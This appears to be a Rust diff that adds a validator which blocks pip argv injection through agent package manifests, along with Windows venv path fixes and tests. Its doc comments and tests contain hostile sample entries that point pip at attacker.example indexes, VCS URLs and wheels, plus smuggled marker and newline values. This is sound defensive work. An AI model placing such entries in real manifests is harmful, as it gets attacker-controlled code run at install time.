@@ -29,6 +29,8 @@ use tokio::io::AsyncReadExt;
 use apollia_core::SandboxProfile;
 
 use crate::descriptor::{ToolDescriptor, ToolKind};
+// Only referenced from the Unix spawn paths; the non-Unix build has no rlimits.
+#[cfg(unix)]
 use crate::tools::rlimits::{apply_rlimits, ResourceLimits};
 
 /// Executor that runs Python code in a per-agent isolated virtualenv.
@@ -94,6 +96,15 @@ pub enum PythonExecutorError {
     /// The OS refused to spawn the Python process.
     #[error("failed to spawn python process: {0}")]
     SpawnFailed(String),
+    /// A declared package is not a plain requirement specifier and was refused
+    /// before reaching `pip`.
+    #[error("refused package specifier '{package}': {reason}")]
+    InvalidPackageSpec {
+        /// The offending entry, as declared in the manifest.
+        package: String,
+        /// Why it was refused, phrased for whoever wrote the manifest.
+        reason: String,
+    },
     /// I/O error reading stdout or stderr from the child process.
     #[error("output capture failed: {0}")]
     OutputCaptureFailed(String),
@@ -138,6 +149,165 @@ pub fn agent_venv_site_packages(venv_base_dir: &Path, agent_name: &str) -> Vec<P
     candidates
 }
 
+/// Path to an executable inside a virtualenv, per platform layout.
+///
+/// `venv/bin/<name>` on POSIX, `venv/Scripts/<name>.exe` on Windows. Hardcoding
+/// the POSIX shape left every per-agent virtualenv unusable on Windows: neither
+/// the interpreter nor `pip` resolved, so package installation and agent
+/// execution both failed.
+pub fn venv_script(venv_path: &Path, name: &str) -> PathBuf {
+    if cfg!(windows) {
+        venv_path.join("Scripts").join(format!("{name}.exe"))
+    } else {
+        venv_path.join("bin").join(name)
+    }
+}
+
+/// Longest accepted requirement specifier. Real ones are far shorter; a long
+/// entry is either a mistake or an attempt to smuggle something through.
+const MAX_PACKAGE_SPEC_LEN: usize = 200;
+
+/// A plain PEP 508 requirement without its marker: name, optional extras,
+/// optional version specifiers. Deliberately narrower than the full grammar,
+/// which also allows direct URL references.
+static PACKAGE_SPEC_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+    // SAFETY: compiled from a literal pattern, so it cannot fail at runtime.
+    #[allow(clippy::unwrap_used)]
+    regex::Regex::new(concat!(
+        r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?",
+        r"(?:\[[A-Za-z0-9][A-Za-z0-9._,-]*\])?",
+        r"(?:\s*(?:===|==|!=|~=|>=|<=|>|<)\s*[A-Za-z0-9][A-Za-z0-9._*+!-]*",
+        r"(?:\s*,\s*(?:===|==|!=|~=|>=|<=|>|<)\s*[A-Za-z0-9][A-Za-z0-9._*+!-]*)*)?$",
+    ))
+    .unwrap()
+});
+
+/// The closed set of environment-marker variables defined by PEP 508.
+///
+/// Checked against explicitly rather than with a permissive character class: a
+/// charset that merely allows letters and spaces accepts `; import os`, which is
+/// not a marker at all. Anything outside this vocabulary is refused.
+const MARKER_VARIABLES: &[&str] = &[
+    "python_version",
+    "python_full_version",
+    "os_name",
+    "sys_platform",
+    "platform_release",
+    "platform_system",
+    "platform_version",
+    "platform_machine",
+    "platform_python_implementation",
+    "implementation_name",
+    "implementation_version",
+    "extra",
+];
+
+/// Accepts an environment marker built only from PEP 508 vocabulary.
+///
+/// Every bare word must be a marker variable or a boolean/membership operator;
+/// everything else must be a quoted literal, an operator or punctuation.
+fn marker_is_wellformed(marker: &str) -> bool {
+    if marker.trim().is_empty() {
+        return false;
+    }
+    let mut rest = marker;
+    while let Some(start) = rest.find(['"', '\'']) {
+        let quote = rest.as_bytes()[start];
+        let after = &rest[start + 1..];
+        let Some(end) = after.find(quote as char) else {
+            return false; // unterminated literal
+        };
+        if !bare_words_are_marker_vocabulary(&rest[..start]) {
+            return false;
+        }
+        // Literals themselves are opaque; only their content charset matters.
+        if after[..end].chars().any(|c| c.is_control()) {
+            return false;
+        }
+        rest = &after[end + 1..];
+    }
+    bare_words_are_marker_vocabulary(rest)
+}
+
+/// Every alphabetic token outside quotes must belong to the marker vocabulary.
+fn bare_words_are_marker_vocabulary(segment: &str) -> bool {
+    segment
+        .split(|c: char| !(c.is_alphanumeric() || c == '_'))
+        .filter(|w| !w.is_empty() && w.chars().any(|c| c.is_alphabetic()))
+        .all(|w| MARKER_VARIABLES.contains(&w) || matches!(w, "and" | "or" | "not" | "in"))
+}
+
+/// Rejects anything that is not a plain package requirement.
+///
+/// # Why this exists
+///
+/// `setup_venv` passes each declared package straight into
+/// `pip install <package>` as an argv element. `pip` reads any element starting
+/// with `-` as a **flag**, not as a package name, so a manifest declaring
+/// `packages = ["--index-url=https://attacker.example/simple", "requests"]`
+/// silently redirects the package index and gets attacker-controlled code
+/// executed by `setup.py` at install time, with the user's rights and before any
+/// sandbox is involved. `-e`, `-r`, `--pre` and `--extra-index-url` are the same
+/// class. There is no shell here, so this is not shell injection: it is argv
+/// injection into `pip`, which is just as effective.
+///
+/// Direct references (`pkg @ https://...`), VCS URLs (`git+https://...`) and
+/// local paths are refused too. They are legal PEP 508 but they all mean "fetch
+/// and execute code from somewhere this manifest chose", which is exactly what
+/// the declaration is not allowed to decide.
+pub fn validate_package_spec(package: &str) -> Result<(), PythonExecutorError> {
+    let refuse = |reason: &str| {
+        Err(PythonExecutorError::InvalidPackageSpec {
+            package: package.to_string(),
+            reason: reason.to_string(),
+        })
+    };
+
+    let spec = package.trim();
+    if spec.is_empty() {
+        return refuse("empty entry");
+    }
+    if spec.len() > MAX_PACKAGE_SPEC_LEN {
+        return refuse("longer than a requirement specifier can legitimately be");
+    }
+    if spec.chars().any(|c| c.is_control()) {
+        return refuse("contains a control character");
+    }
+    // The load-bearing check: pip would treat this as an option.
+    if spec.starts_with('-') {
+        return refuse(
+            "starts with '-', which pip reads as a command-line flag rather than a package",
+        );
+    }
+    if spec.contains('@') {
+        return refuse(
+            "direct URL references are not accepted, declare a released version instead",
+        );
+    }
+    if spec.contains("://") || spec.starts_with("git+") || spec.starts_with("file:") {
+        return refuse("URLs are not accepted, declare a released version instead");
+    }
+    if spec.starts_with('.') || spec.starts_with('/') || spec.contains('/') {
+        return refuse("local paths are not accepted, declare a released version instead");
+    }
+    // Split off the environment marker, which has its own closed vocabulary.
+    let (requirement, marker) = match spec.split_once(';') {
+        Some((req, marker)) => (req.trim(), Some(marker.trim())),
+        None => (spec, None),
+    };
+    if !PACKAGE_SPEC_RE.is_match(requirement) {
+        return refuse(
+            "not a plain requirement specifier (name, optional extras, optional version)",
+        );
+    }
+    if let Some(marker) = marker {
+        if !marker_is_wellformed(marker) {
+            return refuse("environment marker uses something other than PEP 508 vocabulary");
+        }
+    }
+    Ok(())
+}
+
 impl PythonExecutor {
     /// Creates a `PythonExecutor` for the given agent.
     ///
@@ -161,7 +331,7 @@ impl PythonExecutor {
         }
 
         let venv_path = venv_base_dir.join(agent_id).join("venv");
-        let python_bin = venv_path.join("bin").join("python");
+        let python_bin = venv_script(&venv_path, "python");
 
         Ok(Self {
             agent_id: agent_id.to_string(),
@@ -184,6 +354,14 @@ impl PythonExecutor {
     /// - [`PythonExecutorError::VenvCreationFailed`]: `python3 -m venv` failed
     /// - [`PythonExecutorError::PackageInstallFailed`]: `pip install <package>` failed
     pub async fn setup_venv(&self, packages: &[String]) -> Result<(), PythonExecutorError> {
+        // Refuse the whole list before touching the filesystem. An agent manifest
+        // is untrusted input and every entry becomes an argv element for `pip`,
+        // so this is the chokepoint that keeps a flag out of that position.
+        // Validating upfront also avoids a half-populated virtualenv.
+        for package in packages {
+            validate_package_spec(package)?;
+        }
+
         // Idempotent: skip creation if the venv interpreter already resolves to a live binary.
         // `Path::exists()` follows symlinks: returns false for broken symlinks.
         // This handles INITIALIZING restarts without blowing away installed packages.
@@ -224,7 +402,7 @@ impl PythonExecutor {
             }
         }
 
-        let pip_bin = self.venv_path.join("bin").join("pip");
+        let pip_bin = venv_script(&self.venv_path, "pip");
 
         for package in packages {
             tracing::info!(
@@ -629,5 +807,162 @@ mod tests {
         // THEN
         assert_eq!(descriptor.name, "python_executor");
         assert!(descriptor.validate().is_ok());
+    }
+
+    // ── Package specifier validation ─────────────────────────────────────────
+
+    fn reason_for(spec: &str) -> String {
+        match validate_package_spec(spec) {
+            Err(PythonExecutorError::InvalidPackageSpec { reason, .. }) => reason,
+            other => panic!("expected {spec:?} to be refused, got {other:?}"),
+        }
+    }
+
+    // GIVEN a manifest entry that pip would read as a command-line flag
+    // WHEN it is validated
+    // THEN it is refused, and the reason names the flag problem. This is the
+    //      argv-injection path: --index-url redirects the package index and gets
+    //      attacker-controlled setup.py code executed at install time.
+    #[test]
+    fn test_flag_like_entries_are_refused() {
+        for spec in [
+            "--index-url=https://attacker.example/simple",
+            "--extra-index-url=https://attacker.example/simple",
+            "-i",
+            "-e",
+            "-r",
+            "--pre",
+            "-e .",
+            "-r requirements.txt",
+            "--trusted-host=attacker.example",
+        ] {
+            let reason = reason_for(spec);
+            assert!(
+                reason.contains("flag"),
+                "{spec:?} should be refused as a flag, got: {reason}"
+            );
+        }
+    }
+
+    // GIVEN an entry that would make pip fetch code from an arbitrary location
+    // WHEN it is validated
+    // THEN it is refused: a manifest does not get to choose the code source
+    #[test]
+    fn test_url_vcs_and_path_entries_are_refused() {
+        for spec in [
+            "requests @ https://attacker.example/x.whl",
+            "git+https://attacker.example/repo.git",
+            "git+ssh://attacker.example/repo.git",
+            "file:///tmp/evil",
+            "https://attacker.example/x.whl",
+            "./local-package",
+            "/abs/path",
+            "sub/dir",
+        ] {
+            assert!(
+                validate_package_spec(spec).is_err(),
+                "{spec:?} should be refused"
+            );
+        }
+    }
+
+    // GIVEN degenerate or hostile-looking entries
+    // WHEN they are validated
+    // THEN they are refused before reaching pip
+    #[test]
+    fn test_degenerate_entries_are_refused() {
+        assert!(validate_package_spec("").is_err());
+        assert!(validate_package_spec("   ").is_err());
+        assert!(validate_package_spec("requests\n--index-url=http://x").is_err());
+        assert!(validate_package_spec("requests; import os").is_err());
+        assert!(validate_package_spec(&"a".repeat(MAX_PACKAGE_SPEC_LEN + 1)).is_err());
+    }
+
+    // GIVEN the requirement shapes a real manifest uses
+    // WHEN they are validated
+    // THEN they all pass: the guard must not break legitimate declarations,
+    //      which is the failure mode that would push people to disable it
+    #[test]
+    fn test_legitimate_specifiers_are_accepted() {
+        for spec in [
+            "requests",
+            "openpyxl>=3.1.0",
+            "pandas==2.1.4",
+            "numpy~=1.26",
+            "uvicorn[standard]>=0.30",
+            "httpx[http2,cli]",
+            "foo>=1.0,<2.0",
+            "ruamel.yaml",
+            "zope.interface>=5",
+            "python-dateutil!=2.8.1",
+            "typing-extensions>=4.0.0",
+            "pkg>=1.0 ; python_version >= \"3.10\"",
+        ] {
+            assert!(
+                validate_package_spec(spec).is_ok(),
+                "{spec:?} should be accepted, got {:?}",
+                validate_package_spec(spec)
+            );
+        }
+    }
+
+    // GIVEN environment markers, real ones and things merely shaped like one
+    // WHEN they are validated
+    // THEN only PEP 508 vocabulary passes. A charset that just allows letters
+    //      and spaces would accept `; import os`, which is not a marker.
+    #[test]
+    fn test_environment_markers_are_held_to_pep_508_vocabulary() {
+        for spec in [
+            "pkg ; python_version >= \"3.10\"",
+            "pkg ; sys_platform == \"darwin\"",
+            "pkg ; os_name == \"posix\" and python_version < \"3.13\"",
+            "pkg ; platform_machine == \"arm64\"",
+            "pkg ; extra == \"dev\"",
+        ] {
+            assert!(
+                validate_package_spec(spec).is_ok(),
+                "{spec:?} is a valid marker, got {:?}",
+                validate_package_spec(spec)
+            );
+        }
+        for spec in [
+            "pkg ; import os",
+            "pkg ; __import__(\"os\")",
+            "pkg ; python_version >= \"3.10\" and eval(x)",
+            "pkg ; unterminated == \"quote",
+            "pkg ;",
+        ] {
+            assert!(
+                validate_package_spec(spec).is_err(),
+                "{spec:?} should be refused"
+            );
+        }
+    }
+
+    // GIVEN a package list containing one hostile entry among valid ones
+    // WHEN setup_venv runs
+    // THEN it fails before creating anything, so no partial venv is left and
+    //      the valid packages are not installed either
+    #[tokio::test]
+    async fn test_setup_venv_refuses_the_whole_list_and_creates_nothing() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let executor = PythonExecutor::new("victim-agent", tmp.path()).expect("executor");
+        let packages = vec![
+            "requests".to_string(),
+            "--index-url=https://attacker.example/simple".to_string(),
+        ];
+
+        let result = executor.setup_venv(&packages).await;
+
+        match result {
+            Err(PythonExecutorError::InvalidPackageSpec { package, .. }) => {
+                assert_eq!(package, "--index-url=https://attacker.example/simple");
+            }
+            other => panic!("expected InvalidPackageSpec, got {other:?}"),
+        }
+        assert!(
+            !tmp.path().join("victim-agent").join("venv").exists(),
+            "no virtualenv should have been created"
+        );
     }
 }
